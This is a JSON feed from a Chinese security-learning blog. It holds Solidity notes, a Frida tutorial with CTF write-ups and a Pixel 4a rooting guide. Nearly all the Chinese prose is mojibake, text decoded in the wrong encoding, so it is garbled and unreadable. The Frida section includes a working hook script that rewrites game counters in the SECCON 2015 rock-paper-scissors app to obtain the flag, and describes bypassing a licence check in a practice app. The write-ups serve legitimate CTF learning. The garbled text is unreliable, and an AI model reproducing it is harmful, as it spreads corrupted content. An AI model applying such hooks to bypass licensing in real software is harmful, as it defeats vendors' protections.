æä¾›çš„ä½çº§è°ƒç”¨å‡½æ•°ï¼ˆcallã€delegatecallã€callcodeï¼‰è¿›è¡Œåˆçº¦å­è°ƒç”¨æ—¶è‹¥äº§ç”Ÿå¼‚å¸¸å°†è¿”å› falseï¼Œä»è€Œä¸ä¼šå°†å­è°ƒç”¨ä¹‹å¤–ä¿®æ”¹çš„çŠ¶æ€å›æ»šã€‚</p>\n<p><strong>ä»¥å¤ªåŠåº•å±‚å®ç°</strong></p>\n<p>ä»¥å¤ªåŠé€šè¿‡è®°å½•çŠ¶æ€æ ¹è¿›è¡ŒçŠ¶æ€å›æ»šï¼Œåœ¨å‘ç”Ÿå¼‚å¸¸æ—¶å›åˆ°äº¤æ˜“æ‰§è¡Œå‰çš„çŠ¶æ€æ ¹ã€ä¸”ä¸è®°å½•æ—¥å¿—ã€‚</p>\n<p><strong>Solidity é”™è¯¯å¤„ç†å‡½æ•°</strong></p>\n<p>assert (æ¡ä»¶å‚æ•°)</p>\n<p>å¦‚æœæ¡ä»¶å‚æ•°ä¸º falseï¼Œåˆ™ä½¿å½“å‰äº¤æ˜“æ²¡æœ‰æ•ˆæœï¼Œå¹¶æ¶ˆè€—äº¤æ˜“å‰©ä½™çš„ gasã€‚</p>\n<p>require (æ¡ä»¶å‚æ•°ï¼Œ[æ¶ˆæ¯å‚æ•°])</p>\n<p>å¦‚æœæ¡ä»¶å‚æ•°ä¸º falseï¼Œåˆ™æ’¤é”€çŠ¶æ€æ›´æ”¹ï¼Œå¹¶ä¸”ï¼Œå¦‚æœè¿˜ä¼ å…¥äº†æ¶ˆæ¯å‚æ•°ï¼Œåˆ™æä¾›ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ã€‚</p>\n<p>revert ([æ¶ˆæ¯å‚æ•°])</p>\n<p>ç»ˆæ­¢è¿è¡Œå¹¶æ’¤é”€çŠ¶æ€æ›´æ”¹ï¼Œå¦‚æœè¿˜ä¼ å…¥äº†æ¶ˆæ¯å‚æ•°ï¼Œåˆ™æä¾›ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ã€‚</p>\n<h3 id=\"ç§æœ‰é“¾æ­å»º\"><a class=\"markdownIt-Anchor\" href=\"#ç§æœ‰é“¾æ­å»º\">#</a> ç§æœ‰é“¾æ­å»º</h3>\n<p>å¤ä¹ è€ƒè¯• ç­‰å‡ å¤©å†è¡¥ä¸Š</p>\n<h3 id=\"ç°åœ¨æ°´é¾™å¤´éš¾ææµ‹è¯•å¸éƒ½é¢†ä¸åˆ°åŠ›\"><a class=\"markdownIt-Anchor\" href=\"#ç°åœ¨æ°´é¾™å¤´éš¾ææµ‹è¯•å¸éƒ½é¢†ä¸åˆ°åŠ›\">#</a> ç°åœ¨æ°´é¾™å¤´éš¾æï¼Œæµ‹è¯•å¸éƒ½é¢†ä¸åˆ°åŠ›</h3>\n<p><img data-src=\"/images/image-20230523154742681.png\" alt=\"image-20230523154742681\"></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/05/28/%E5%88%9D%E8%AF%86Frida/",
            "url": "https://3cly.github.io/2023/05/28/%E5%88%9D%E8%AF%86Frida/",
            "title": "åˆè¯†Frida",
            "date_published": "2023-05-28T00:19:12.000Z",
            "content_html": "<h1 id=\"noobã®frida_study\"><a class=\"markdownIt-Anchor\" href=\"#noobã®frida_study\">#</a> noob ã® Frida_study</h1>\n<p>!! ä¸€çœ¼ä¸çœŸ é‰´å®šä¸ºæˆ‘æ˜¯ä¸€ä¸ªçº¯çº¯çš„å¤§æ‘†å­ å­¦ä¹ ä¸è¡Œè¦æŒ‚ç§‘ CTF é¢˜åšä¸æ¥ åªæœ‰ç¡è§‰æ‰ç»´æŒå¾—äº†ç”Ÿæ´»ï¼ï¼</p>\n<h2 id=\"æ­å»ºç¯å¢ƒ\"><a class=\"markdownIt-Anchor\" href=\"#æ­å»ºç¯å¢ƒ\">#</a> æ­å»ºç¯å¢ƒ</h2>\n<p>mumu æ¨¡æ‹Ÿå™¨æçš„ QAQ</p>\n<p><img data-src=\"/images/image-20230420214437839.png\" alt=\"image-20230420214437839\"></p>\n<p>ä¸è¡Œå•Š Frida è¿‡ååœ¨æ¨¡æ‹Ÿå™¨è¿è¡Œ APP æ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹å°é—®é¢˜ å¾—æƒ³åŠæ³•æä¸€ä¸ªçœŸæœºå…ˆ</p>\n<h3 id=\"çœŸæœºæµ‹è¯•\"><a class=\"markdownIt-Anchor\" href=\"#çœŸæœºæµ‹è¯•\">#</a> çœŸæœºæµ‹è¯•</h3>\n<p><img data-src=\"/images/image-20230425233608122.png\" alt=\"image-20230425233608122\"></p>\n<h3 id=\"æ­å»ºfridaå¼€å‘ç¯å¢ƒ\"><a class=\"markdownIt-Anchor\" href=\"#æ­å»ºfridaå¼€å‘ç¯å¢ƒ\">#</a> æ­å»º frida å¼€å‘ç¯å¢ƒ</h3>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git clone git<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>oleavr<span class=\"token operator\">/</span>frida<span class=\"token operator\">-</span>agent<span class=\"token operator\">-</span>example<span class=\"token punctuation\">.</span>git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> cd frida<span class=\"token operator\">-</span>agent<span class=\"token operator\">-</span>example<span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> npm install</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> frida <span class=\"token operator\">-</span><span class=\"token constant\">U</span> <span class=\"token operator\">-</span>f com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>android <span class=\"token operator\">--</span>no<span class=\"token operator\">-</span>pause <span class=\"token operator\">-</span>l _agent<span class=\"token punctuation\">.</span>js è¿™é‡Œæˆ‘ç›´æ¥VScodeäº†</pre></td></tr></table></figure><h3 id=\"fridaå¸¸ç”¨å‘½ä»¤\"><a class=\"markdownIt-Anchor\" href=\"#fridaå¸¸ç”¨å‘½ä»¤\">#</a> frida å¸¸ç”¨å‘½ä»¤</h3>\n<pre><code>frida-ls-devices # åˆ—å‡ºæ‰€æœ‰è®¾å¤‡\n\nfrida-ps -U # åˆ—å‡ºusbè®¾å¤‡çš„è¿›ç¨‹\n\nfrida-ps -Ua # åˆ—å‡ºæ­£åœ¨è·‘çš„åº”ç”¨\n\nfrida-ps -Uai # åˆ—å‡ºæ‰€æœ‰å®‰è£…çš„åº”ç”¨\n\nfrida-ps -D xxxxx # è¿æ¥æŒ‡å®šçš„è®¾å¤‡ï¼Œè®¾å¤‡idå¯ä»¥ä»ç¬¬ä¸€æ¡å‘½ä»¤è·å¾—\n\n# å¯åŠ¨åº”ç”¨å¹¶æ³¨å…¥è„šæœ¬ åé¢ä¼šæåˆ°è¿™ä¸¤è€…çš„åŒºåˆ«\nfrida -U -l exploit.js -f com.xxx.yyy\n\n# åº”ç”¨å·²ç»åœ¨è¿è¡Œï¼Œæ³¨å…¥è„šæœ¬\nfrida -U -l exploit.js &quot;XXXX&quot;\n</code></pre>\n<h2 id=\"å®è·µ\"><a class=\"markdownIt-Anchor\" href=\"#å®è·µ\">#</a> å®è·µ</h2>\n<h3 id=\"fridaå¯¹å‡½æ•°çš„è°ƒç”¨\"><a class=\"markdownIt-Anchor\" href=\"#fridaå¯¹å‡½æ•°çš„è°ƒç”¨\">#</a> Frida å¯¹å‡½æ•°çš„è°ƒç”¨</h3>\n<h3 id=\"frida_hook\"><a class=\"markdownIt-Anchor\" href=\"#frida_hook\">#</a> Frida_Hook</h3>\n<p>1.attach</p>\n<p><img data-src=\"/images/image-20230426230045546.png\" alt=\"image-20230426230045546\"></p>\n<p>å¯¹æ‰‹æœºæœ€å‰é¢çš„ä¸€ä¸ªè¿›ç¨‹æ“ä½œ (æˆ–è€… frida -UF)</p>\n<p>æˆ– frida -U -n åå­—</p>\n<p>2.spawn</p>\n<p>frida -U -f (åŒ…å)</p>\n<h3 id=\"ctfé¢˜\"><a class=\"markdownIt-Anchor\" href=\"#ctfé¢˜\">#</a> CTF é¢˜</h3>\n<p>å­¦ä¹ åœ¨ java å±‚æ€ä¹ˆä½¿ç”¨ frida å®ç°ï¼š</p>\n<ol>\n<li>ä»»æ„ç±»æ–¹æ³•è°ƒç”¨ã€‚</li>\n<li>ä»»æ„ç±»æ–¹æ³•é‡å®ç°ã€‚</li>\n</ol>\n<h4 id=\"rps\"><a class=\"markdownIt-Anchor\" href=\"#rps\">#</a> rps</h4>\n<p>ä½¿ç”¨ jadx åç¼–è¯‘å¾—åˆ°</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">Runnable</span> showMessageTask <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Runnable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token class-name\">TextView</span> tv3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>textView3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">MainActivity</span> mainActivity<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">-</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                mainActivity <span class=\"token operator\">=</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                mainActivity<span class=\"token punctuation\">.</span>cnt<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WIN! +\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">-</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LOSE +0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">==</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DRAW +\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m <span class=\"token operator\">&lt;</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LOSE +0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                mainActivity <span class=\"token operator\">=</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                mainActivity<span class=\"token punctuation\">.</span>cnt<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WIN! +\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token comment\">// è·èƒœ 1000 æ¬¡åˆ™èƒ½å¤Ÿè·å– flag</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1000</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                tv3<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SECCON&#123;\"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt <span class=\"token operator\">+</span> <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">calc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">107</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token class-name\">MainActivity</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ†æ calc () æ–¹æ³•èƒ½ç®—å‡ºç­”æ¡ˆï¼Œä½†è¿™ä¸ªæ–¹æ³•åœ¨ so ä¸­ï¼Œå¾—åˆ†ææ±‡ç¼–ä»£ç æ‰è¡Œï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ ida</p>\n<p>è¿™é‡Œæˆ‘ä»¬ç”¨ frida hook è§£å†³ è®© cnt çš„å€¼æ„é€ æˆ 1000 å³å¯</p>\n<pre><code>frida -U -l test.js -f com.example.seccon2015.rock_paper_scissors\n</code></pre>\n<p><img data-src=\"/images/image-20230428165101481.png\" alt=\"image-20230428165101481\"></p>\n<p>JS è„šæœ¬:</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// é€‰æ‹©ç±»</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">const</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'com.example.seccon2015.rock_paper_scissors.MainActivity'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// é€‰æ‹© onClick æ–¹æ³•</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">const</span> onClick <span class=\"token operator\">=</span> MainActivity<span class=\"token punctuation\">.</span>onClick<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// hook onClick</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  onClick<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™æ‰“å°ä¸€æ¡æ¶ˆæ¯</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">send</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'onClick'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// è°ƒç”¨åŸå§‹çš„ onClick æ–¹æ³•</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">onClick</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// è°ƒç”¨å®Œä¹‹åä¿®æ”¹ m,n,cnt çš„å€¼</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>m<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token number\">999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">//frida æ§åˆ¶å°æ‰“å°ç»“æœ</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">//hook ç»“æŸ</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'Done:'</span> <span class=\"token punctuation\">,</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cnt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"/images/IMG_3353.JPG\" alt=\"IMG_3353\"></p>\n<h4 id=\"whyshouldipay\"><a class=\"markdownIt-Anchor\" href=\"#whyshouldipay\">#</a> WhyShouldIPay</h4>\n<p><img data-src=\"/images/E2951965E57EE62ECEAE38BF90CA3C74.png\" alt=\"E2951965E57EE62ECEAE38BF90CA3C74\"></p>\n<p>PREMIUM CONETNT å†…å®¹éœ€è¦è¾“å…¥ License éªŒè¯åæ‰èƒ½çœ‹</p>\n<p><img data-src=\"/images/image-20230525224401533.png\" alt=\"image-20230525224401533\"></p>\n<p>MainActivity ä¸­çœ‹åˆ° xor åŠ å¯†æ–¹æ³• æŒ‰ x æŸ¥æ‰¾ç”¨ä¾‹</p>\n<p><img data-src=\"/images/image-20230525225126860.png\" alt=\"image-20230525225126860\"></p>\n<p>å‘ç° LauncherActivity æ˜¯éªŒè¯éƒ¨åˆ†ï¼Œå‰é¢æœ‰ä¸ªç½‘ç»œéªŒè¯ï¼Œæ˜¾ç„¶éœ€è¦ç»•è¿‡ï¼Œåé¢è°ƒç”¨äº† xor æ–¹æ³•è¿ç®—</p>\n<p><img data-src=\"/images/image-20230525232412393.png\" alt=\"image-20230525232412393\"></p>\n<p>å…ˆ hook ä¸€ä¸‹çœ‹ mac å€¼</p>\n<p>ç›´æ¥æ„é€  Key å† hook verifyClick æ–¹æ³• ç›´æ¥ show flag å³å¯</p>\n<p><img data-src=\"/images/image-20230525233305169.png\" alt=\"image-20230525233305169\"></p>\n<p><img data-src=\"/images/F4D85F20BD673EB118AB34E387218A17.png\" alt=\"F4D85F20BD673EB118AB34E387218A17\"></p>\n<h2 id=\"å‘\"><a class=\"markdownIt-Anchor\" href=\"#å‘\">#</a> å‘</h2>\n<p>Frida ç‰ˆæœ¬ä¸€å®šä¸è¦é«˜ï¼ï¼ï¼</p>\n<p>å®‰å“æ‰‹æœºç‰ˆæœ¬å¤ªé«˜ æäº†æˆ‘ 10 ä¸ªå°æ—¶ ç„¯ï¼</p>\n<p><img data-src=\"/images/image-20230428115227442.png\" alt=\"image-20230428115227442\"></p>\n<p>å¿ƒæ€çˆ†ç‚¸ä¹‹åˆé‡æ–°æ¢æˆå®‰å“ 10 åˆ ROOT ä¹‹ç»ˆäºæˆåŠŸäº†</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/04/25/pixel-4a-root/",
            "url": "https://3cly.github.io/2023/04/25/pixel-4a-root/",
            "title": "pixel 4a root",
            "date_published": "2023-04-25T13:44:31.000Z",
            "content_html": "<h1 id=\"pixel-4a-root\"><a class=\"markdownIt-Anchor\" href=\"#pixel-4a-root\">#</a> pixel 4a root</h1>\n<p>å®‰å“æ‰‹æœºå‹å·:pixel 4a</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424202332.png\" alt=\"QQå›¾ç‰‡20230424202332\"></p>\n<p><strong>ç”µè„‘</strong>å…ˆä¸‹è½½ SDK å¹³å°å·¥å…· (<strong>ä¿è¯æœ‰ adb å’Œ fastboot</strong>)</p>\n<p><strong>æ‰‹æœº</strong>åœ¨é‡å¯çš„æ—¶å€™åœ¨é»‘å±çš„ç¬é—´æŒ‰ä½éŸ³é‡é”®çš„å‡å°é”®å‡ ç§’é’Ÿï¼Œç›´åˆ°å±å¹•å˜æˆè¿™ç§çŠ¶æ€ï¼ŒUSB è¿æ¥è‡³ç”µè„‘</p>\n<p>åœ¨ç”µè„‘è¿è¡Œ</p>\n<pre><code>fastboot flashing unlock\n</code></pre>\n<img data-src=\"/images/IMG_3302.JPG\" alt=\"IMG_3302\">\n<p>è°ƒèŠ‚é€‰é¡¹ é€‰æ‹© unlock å†æŒ‰ç”µæºé”®ç¡®è®¤</p>\n<p><img data-src=\"/images/IMG_3300.JPG\" alt=\"IMG_3300\"></p>\n<p>åœ¨ github ä¸Šä¸‹è½½ä¸€ä¸ª Magisk.apk åœ¨å®‰å“æ‰‹æœºä¸Šå®‰è£…</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424205338.png\" alt=\"QQå›¾ç‰‡20230424205338\"></p>\n<p>åœ¨å®‰å“è°·æ­Œå®˜ç½‘æ‰¾ä¸€ä¸ª<strong>å’Œä½ æ‰‹æœºç‰ˆæœ¬ç›¸åŒçš„é•œåƒ</strong> zip, è§£å‹åæ‰¾å‡º boot.img æ–‡ä»¶ push ç»™æ‰‹æœº</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424205913.png\" alt=\"QQå›¾ç‰‡20230424205913\"></p>\n<p>åˆ©ç”¨ Magisk ä¿®å¤é•œåƒ</p>\n<p><img data-src=\"/images/IMG_3301.JPG\" alt=\"IMG_3301\"></p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424210621.png\" alt=\"QQå›¾ç‰‡20230424210621\"></p>\n<p>ä¿®å¤å®Œåä»–ä¼šåœ¨ç›¸åŒç›®å½•ä¿å­˜ä¿®å¤åçš„ img ç»™å®ƒ pull å›ç”µè„‘</p>\n<h5 id=\"å‡ºç°çš„é—®é¢˜åŠè§£å†³\"><a class=\"markdownIt-Anchor\" href=\"#å‡ºç°çš„é—®é¢˜åŠè§£å†³\">#</a> å‡ºç°çš„é—®é¢˜åŠè§£å†³</h5>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230424211231.png\" alt=\"QQå›¾ç‰‡20230424211231\"></p>\n<p>ç 